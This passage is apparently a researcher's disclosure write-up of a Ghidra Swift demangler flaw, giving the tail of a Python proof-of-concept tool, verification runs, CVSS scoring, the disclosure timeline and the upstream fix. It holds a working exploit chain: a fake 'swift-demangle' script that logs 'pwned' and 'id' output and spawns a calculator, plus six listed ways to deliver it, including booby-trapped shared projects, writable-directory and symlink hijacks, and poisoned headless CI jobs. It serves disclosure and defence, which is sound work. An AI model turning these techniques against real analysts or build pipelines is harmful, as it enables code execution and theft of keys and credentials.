    def generate(self, results: Sequence[ComponentResult]) -> Path:
        stage("generating summary")
        lines: list[str] = [
            f"Ghidra 12.1.2 research summary (tool {TOOL_VERSION}, {AUTHOR})",
            "=" * 64,
        ]
        for result in results:
            lines.append("")
            lines.append(f"[{result.status.value.upper():7}] {result.name}: {result.summary}")
            for finding in result.findings:
                lines.append(f"    - {finding}")

        artifacts = self.evidence.artifacts
        if artifacts:
            lines.append("")
            lines.append("Artifacts written:")
            for path in artifacts:
                lines.append(f"    - {path}")

        summary_text = "\n".join(lines)
        for line in summary_text.splitlines():
            LOG.info(line)

        return self.evidence.write_text("", "summary.txt", summary_text)


# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #

class ResearchRunner:
    """Top-level orchestrator: validate -> run selected components -> report.

    Owns component construction (so mode selection lives in one place), enforces
    per-component prerequisites, and translates results into a process exit code
    (0 = every selected component passed / cleanly skipped, non-zero otherwise).
    """

    _REGISTRY = {
        "swift": SwiftAnalyzer,
        "tracermi": TraceManager,
        "sevenzip": SevenZipProbe,
    }

    def __init__(self, config: ResearchConfig) -> None:
        self.config = config
        self.profile = PlatformProfile.detect()
        self.evidence = EvidenceCollector(config.artifacts_dir)
        self.scanner = (
            SourceScanner(config.ghidra_source) if config.ghidra_source else None
        )

    def _build_components(self) -> list[ResearchComponent]:
        components: list[ResearchComponent] = []
        for mode in self.config.modes:
            component_cls = self._REGISTRY[mode]
            components.append(
                component_cls(self.config, self.profile, self.evidence, self.scanner)
            )
        return components

    def run(self) -> int:
        stage("checking prerequisites")
        components = self._build_components()

        env = EnvironmentValidator(self.config, self.profile).validate(components)
        if not env.ok:
            LOG.error("Environment validation failed; aborting.")
            return 3

        stage("running research components")
        results: list[ComponentResult] = []
        for component in components:
            if component.requires_source and self.scanner is None:
                LOG.warning("%s: skipped (no Ghidra source tree)", component.name)
                results.append(
                    ComponentResult(
                        name=component.name,
                        status=Status.SKIPPED,
                        summary="Skipped: no Ghidra source tree available.",
                    )
                )
                continue
            LOG.info("running component: %s", component.name)
            try:
                results.append(component.run())
            except Exception as exc:  # defensive: one bad component must not abort the run
                LOG.exception("%s raised an unexpected error", component.name)
                results.append(
                    ComponentResult(
                        name=component.name,
                        status=Status.ERROR,
                        summary=f"Unhandled error: {exc}",
                    )
                )

        stage("collecting evidence")
        ReportGenerator(self.evidence).generate(results)

        return self._exit_code(results)

    @staticmethod
    def _exit_code(results: Sequence[ComponentResult]) -> int:
        """0 only if nothing errored or came back partial; 2 otherwise."""
        if any(r.status in (Status.ERROR, Status.PARTIAL) for r in results):
            return 2
        return 0


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

def build_parser() -> argparse.ArgumentParser:
    """Construct the command-line interface.

    One entrypoint, one ``--mode`` selector, and two clearly-gated action flags
    (``--execute`` / ``--launch-calc``). Everything defaults to the safest
    behaviour: report-only, no process launches.
    """
    parser = argparse.ArgumentParser(
        prog="research_poc.py",
        description=(
            "Ghidra 12.1.2 responsible-disclosure research framework "
            f"(v{TOOL_VERSION}, by {AUTHOR}). Consolidates the Swift demangler "
            "ACE, TraceRMI conditional RCE, and SevenZipJBinding parser "
            "reachability research into one auditable tool."
        ),
        epilog=(
            "Research modes:\n"
            "  swift     Conditional ACE via the Swift demangler launch sink "
            "(the accepted advisory). Self-contained; no Ghidra source needed.\n"
            "  tracermi  Conditional RCE evidence for TraceRMI agent exec/eval "
            "sinks. Requires a Ghidra 12.1.2 source tree.\n"
            "  sevenzip  Native archive-parser reachability chain. Requires a "
            "Ghidra 12.1.2 source tree.\n"
            "  all       Run every applicable mode (default).\n\n"
            "Nothing dangerous runs unless you opt in with --execute and "
            "--launch-calc."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--mode",
        choices=(*ResearchConfig.ALL_MODES, "all"),
        default="all",
        help="Which research surface to exercise (default: all).",
    )
    parser.add_argument(
        "--ghidra-source",
        type=Path,
        default=None,
        metavar="PATH",
        help="Path to a Ghidra 12.1.2 source tree (else uses $GHIDRA_SOURCE "
        "or a nearby ghidra-12.1.2 directory).",
    )
    parser.add_argument(
        "--artifacts-dir",
        type=Path,
        default=Path(__file__).resolve().parent / "artifacts",
        metavar="PATH",
        help="Directory for generated evidence (default: ./artifacts).",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        help="Actually launch local sinks (e.g. the fake swift-demangle). "
        "Without this, staging is dry-run only.",
    )
    parser.add_argument(
        "--launch-calc",
        action="store_true",
        help="Allow the benign platform calculator to be spawned as the "
        "'arbitrary process executed' marker. Implies intent to --execute.",
    )
    parser.add_argument(
        "--harmless-zip",
        action="store_true",
        help="Emit a benign ZIP sample during the sevenzip mode.",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable debug-level logging.",
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"%(prog)s {TOOL_VERSION} (by {AUTHOR})",
    )
    return parser


def build_config(args: argparse.Namespace) -> ResearchConfig:
    """Translate parsed CLI args into a validated ``ResearchConfig``."""
    modes = ResearchConfig.ALL_MODES if args.mode == "all" else (args.mode,)
    # --launch-calc is meaningless without --execute; treat it as implying it so
    # the operator's intent ("I want to see calc") is honoured without a footgun.
    execute = args.execute or args.launch_calc
    return ResearchConfig(
        modes=modes,
        ghidra_source=ResearchConfig.resolve_source(args.ghidra_source),
        artifacts_dir=args.artifacts_dir.resolve(),
        execute=execute,
        launch_calc=args.launch_calc,
        create_harmless_zip=args.harmless_zip,
        verbose=args.verbose,
    )


def main(argv: Optional[Sequence[str]] = None) -> int:
    """CLI entrypoint. Returns a process exit code."""
    args = build_parser().parse_args(argv)
    configure_logging(args.verbose)
    LOG.info("Ghidra 12.1.2 research framework v%s (%s)", TOOL_VERSION, AUTHOR)
    config = build_config(args)
    try:
        return ResearchRunner(config).run()
    except KeyboardInterrupt:  # graceful Ctrl-C
        LOG.warning("interrupted by user")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
```

</details>

Rule for PoCs: the reviewer has ten minutes and zero patience. Don't make them install Ghidra to find out if you're wasting their time.

So `ghostmangle.py` proves the **sink shape** with zero dependencies. Pure stdlib Python, no Ghidra needed.

```
ghostmangle.py
├── PlatformProfile      OS branching resolved once (calc cmd, script header, chmod)
├── ResearchConfig       run config + Ghidra source resolver
├── SourceScanner        read-only scanner over a Ghidra tree (file:line)
├── EvidenceCollector    owns artifacts/, records every file written
├── ResearchComponent    base contract
│   ├── SwiftAnalyzer    swift-ace — the advisory (self-contained)
│   ├── TraceManager     tracermi-rce — TraceRMI exec/eval sinks
│   └── SevenZipProbe    sevenzip-reachability — native parser chain
├── EnvironmentValidator pre-flight checks
├── ReportGenerator      deterministic summary
└── ResearchRunner       validate → run → report → exit code
```

Three surfaces, three separate classes, because I found three things with three _different_ risk levels and refused to collapse them into one "GHIDRA RCE!!" headline. That's how you get ignored.

### The core staging the fake toolchain

```python
def _write_fake_demangler(self, fake_tool: Path, marker: Path) -> None:
    lines = [self.profile.script_header]              # #!/bin/sh on Linux
    if self.profile.is_windows:
        lines.append(f'echo ran with: %* > "{marker}"\n')
        if self.config.launch_calc:
            lines.append("start \"\" calc.exe\n")
    else:
        lines.append(f'printf "ran with: %s\\n" "$*" > "{marker}"\n')   # captures argv
        if self.config.launch_calc:
            lines.append(f"({self.profile.calc_shell_command()}) &\n")  # pops calc
    fake_tool.write_text("".join(lines), encoding="utf-8")
    self.profile.mark_executable(fake_tool)           # chmod +x
```

Two things worth noting.

The fake tool records the args it received. That's the fingerprint seeing `ran with: --version` proves SINK 1 specifically, not just "some process started."

And the calculator is spawned **by the fake tool**, not by the harness. In the real bug the attacker's binary is what executes, so in the PoC the attacker's binary is what pops calc. Otherwise I'd just be proving Python can start a calculator.

Platform naming matters too Windows Ghidra looks for `swift-demangle.cmd`, Linux/macOS for `swift-demangle`. `PlatformProfile` gets both right so the reproduction is faithful anywhere.

#### The launch itself

```python
subprocess.run([str(fake_tool), "--version"], check=True)
```

Line-for-line mirror of `new ProcessBuilder(swiftDemanglerPath, "--version")`.

#### Running it

Dry run stages everything, executes nothing:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ python3 ghostmangle.py --mode swift
```

```
10:14:22 | INFO    | Ghidra 12.1.2 research framework v2.0.0 (sn0x-sharma)
10:14:22 | INFO    | running component: swift-ace
10:14:22 | INFO    | swift-ace: dry run (pass --execute to launch the fake tool)
10:14:22 | INFO    | [PASS   ] swift-ace: Fake Swift demangler staged; not executed (dry run).
```

Now the full thing:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ python3 ghostmangle.py --mode swift --execute --launch-calc
```

```
10:15:09 | INFO    | swift-ace: launching fake demangler as Ghidra would
Swift demangler calc PoC (sn0x-sharma)
10:15:09 | INFO    | [PASS   ] swift-ace: Swift demangler sink reproduced; attacker binary executed.
10:15:09 | INFO    |     - Fake demangler: artifacts/swift-demangler-calc/fake-swift-bin/swift-demangle
10:15:09 | INFO    |     - Simulated Ghidra launch: swift-demangle --version
10:15:09 | INFO    |     - Execution marker: artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt
```

Calc pops. Marker proves it:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ cat artifacts/swift-demangler-calc/swift_demangler_calc_marker.txt
ran with: --version
```

That one line is the whole advisory. Ghidra's _check that the demangler exists_ is what executed my binary.

***

### Verifying Against Real Ghidra

<figure><img src="../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

The PoC proves the shape. Before filing you verify against the product, or you get "cannot reproduce."

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ mkdir -p /tmp/.sn0x-swift/bin && cat > /tmp/.sn0x-swift/bin/swift-demangle <<'EOF'
#!/bin/sh
printf "pwned by sn0x | argv: %s\n" "$*" >> /tmp/.sn0x-pwn.log
id >> /tmp/.sn0x-pwn.log
(xcalc &) 2>/dev/null
exit 0
EOF
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ chmod +x /tmp/.sn0x-swift/bin/swift-demangle
```

Then watch the syscalls, because `strace` never lies:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ strace -f -e trace=execve -o /tmp/ghidra-execve.log \
    $GHIDRA_HOME/support/analyzeHeadless ~/BB/GHIDRA/victim Victim -process 'target.bin'
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ grep 'swift-demangle' /tmp/ghidra-execve.log
[pid 40912] execve("/tmp/.sn0x-swift/bin/swift-demangle", [..., "--version"], ...) = 0
[pid 40988] execve("/tmp/.sn0x-swift/bin/swift-demangle", [..., "$s4main5ThingV3fooyyF"], ...) = 0
```

Both sinks, from a real Ghidra process. And the payoff:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ cat /tmp/.sn0x-pwn.log
pwned by sn0x | argv: --version
uid=1000(sn0x) gid=1000(sn0x) groups=1000(sn0x),27(sudo),136(docker)
```

That `id` line is the impact statement. Note `docker` in the groups on most analyst boxes, user context is a short hop from root.

Windows equivalent is a Sysmon Event ID 1:

```
Image:            C:\Users\Public\swift\swift-demangle.exe
CommandLine:      "...\swift-demangle.exe" --version
ParentImage:      C:\Program Files\Java\jdk-21\bin\javaw.exe
ParentCommandLine: ... ghidra.GhidraRun
```

Parent is the Ghidra JVM. Child is the attacker binary. Screenshot that and the argument's over.

***

## Every Way To Trigger This

Same sink, six different ways to get the poisoned value in front of it.

### Method 1 - Exported program (`.gzf`)

The one I led the report with. Set the option, `File → Export Program → Ghidra Zip File`, send it.

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ $GHIDRA_HOME/support/analyzeHeadless ~/BB/GHIDRA/victim Victim \
    -import ~/Downloads/totally-legit-sample.gzf
```

### Method 2 -  Whole project directory (`.gpr` + `.rep`)

<figure><img src="../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

Zip the pair and share it. Stronger than Method 1 because you control the entire directory layout, so relative paths become reliable.

```
ctf-shared-project/
├── CTFProject.gpr
├── CTFProject.rep/
└── tools/swift/bin/swift-demangle      ← rides along, +x intact
```

### Method 3 - Relative path

Set the option to `./tools/swift/bin` instead of an absolute path. Now it resolves against Ghidra's working directory, usually where the victim just extracted your zip. Portable across usernames, homedirs, and OSes absolute paths never are.

### Method 4 - Writable-directory hijack

No shared project needed. If the victim already configured a Swift directory and it's writable by anyone but root, drop your own `swift-demangle` there and wait.

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ find / -type d -name bin -path '*swift*' -writable 2>/dev/null
/home/sn0x/toolchains/swift-5.9-RELEASE/usr/bin
/tmp/swift/bin
```

Beautiful sleeper. Nothing runs until the analyst does something they do every day.

### Method 5 - Symlink / junction

Can't write the file but can control a path component? Redirect it. Also defeats naive "is this path allowlisted" checks that compare strings instead of resolving.

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ ln -sf /tmp/.sn0x-swift/bin/swift-demangle ~/toolchains/swift/usr/bin/swift-demangle
```

Windows: `mklink /J`, no admin needed.

### Method 6 - Headless CI

The one that actually scares me, and the reason "User Interaction: Required" undersells this.

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ $GHIDRA_HOME/support/analyzeHeadless /ci/workdir AutoTriage \
    -import /ci/incoming/submitted-sample.gzf -postScript ExtractIOCs.py -deleteProject
```

No analyst watching. No dialog to dismiss. The "user interaction" is an automated job built to eat untrusted input. And CI runners hold cloud tokens, signing keys, registry access, sometimes the docker socket.

***

### Why This Was Possible

Strip the Java away and it's one sentence: **the code trusted a value at the point of use without knowing where the value came from.**

When someone writes an analyzer option, the mental model is "the user configures this." True at the time. Then persistence gets added, because reproducible analysis is a great feature. Then project sharing gets added, because collaboration is a great feature. Each fine alone. Composed, they quietly turn a config field into an attacker-transportable field.

By the time it reaches `ProcessBuilder`, it's just a `File`. A `File` doesn't remember whether a human typed it or whether it was deserialized out of a `.gzf` a stranger emailed you. Provenance was destroyed the moment it hit the options store, so the sink can't be suspicious even in principle.

CWE-427 primary, CWE-494 related.

The lesson worth stealing: **look for serializable state that reaches an execution sink.** Any app with a project, workspace, or session file is a candidate. Ask what's inside it, what gets restored without a prompt, and whether any of it becomes a path, a command, or a class name.

***

### Impact

Ghidra has millions of downloads and it's the default free RE tool on the planet. The users are malware analysts, IR teams, vuln researchers, firmware people, defence contractors, CTF players, university courses.

That's the demographic where a workstation compromise is worth the most unreleased research, client data, malware collections, VPN access, SSH keys to build infra. And every one of them shares projects. "Here's the project, I already did the first pass, check `sub_140001a20`" gets sent thousands of times a day.

Execution lands as the Ghidra user: their session, keys, cookies, cloud creds, source trees. On CI it's the service account, usually more privileged than any human on the box.

The honest limit: it needs the victim to open attacker-supplied project data. Not wormable, not remote-unauth. That's why it's a 7.5 and not a 9.8.

***

### Classification

```
CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H
Base Score: 7.5 (High)
```

Local vector because the poisoned state arrives as a file. High complexity because the Swift path has to actually be reached I didn't pretend the precondition wasn't there. No privileges needed. UI required since someone or some pipeline opens it. Scope unchanged. C/I/A all High because ACE as the user is ACE as the user.

I classified it **conditional ACE, not RCE**. Execution is genuinely arbitrary but stays local with no network channel. Calling it RCE would've been the fastest route to getting the report dismissed as hype.

***

### Disclosure Timeline

```
June 6, 2026   Filed GHSA-pcfh-853f-q3gh privately via GitHub Security Advisory
Week 2         Maintainer: "This is working as intended. Not a security issue."
Week 3         I walk through the silent project-import path in detail
Week 4         Maintainer: "Thank you, I am seeing what you are describing now.
                I could restrict the analyzer to only call swift from the PATH,
                which would address this exact issue."
Week 4         Fix committed: c03a70d
Week 5         Report accepted
Week 7         CVE-2026-18718 assigned
```

The pushback was expected. "Working as intended" is the standard first reply to anything with a precondition the maintainer pictured a user who misconfigured their own directory. The fix is a concrete reproduction path that makes the _attacker-controlled_ scenario undeniable. Once he saw the project-import chain, it went from "won't fix" to a committed patch in the same week.

***

### The Fix

`c03a70d` restricts the analyzer to calling `swift` from the system `PATH` and drops the configurable tool directory entirely.

<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (541).png" alt=""><figcaption></figcaption></figure>

```java
// before — attacker-influenceable join
new File(swiftToolDir, "swift-demangle")

// after — PATH only, no program-persisted directory in the join
findOnPath("swift")
```

Right call, and I said so in the thread. The softer options prompt on restored paths, allowlist locations, re-confirm on import are all more code and more places to get it subtly wrong. Deleting the attacker-controllable input beats sanitising it.

Even if a malicious project still carries the option, it no longer affects which binary runs.

Stuck on an unpatched version? Turn the Swift Demangler analyzer off before opening projects you didn't create, and check `Analysis → Auto Analyze → Analyzers` on anything you import.

***

### Attack Chain

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

***

### References

* [https://github.com/NationalSecurityAgency/ghidra/security/advisories/GHSA-pcfh-853f-q3gh](https://github.com/NationalSecurityAgency/ghidra/security/advisories/GHSA-pcfh-853f-q3gh)
* [https://nvd.nist.gov/vuln/detail/CVE-2026-18718](https://nvd.nist.gov/vuln/detail/CVE-2026-18718)
* [NationalSecurityAgency/ghidra@c03a70d](https://github.com/NationalSecurityAgency/ghidra/commit/c03a70d)
* [https://app.notion.com/p/Conditional-Arbitrary-Code-Execution-via-Swift-Demangler-Analyzer-ACE-GHIDRA-3a650723849f80679876df165fe4368b](https://app.notion.com/p/Conditional-Arbitrary-Code-Execution-via-Swift-Demangler-Analyzer-ACE-GHIDRA-3a650723849f80679876df165fe4368b)
* [https://github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
* [https://www.vulncheck.com/advisories/ghidra-swift-demangler-analyzer-arbitrary-code-execution-via-project-state](https://www.vulncheck.com/advisories/ghidra-swift-demangler-analyzer-arbitrary-code-execution-via-project-state)
* [https://github.com/sn0x-sharma/CVE-2026-18718](https://github.com/sn0x-sharma/CVE-2026-18718)

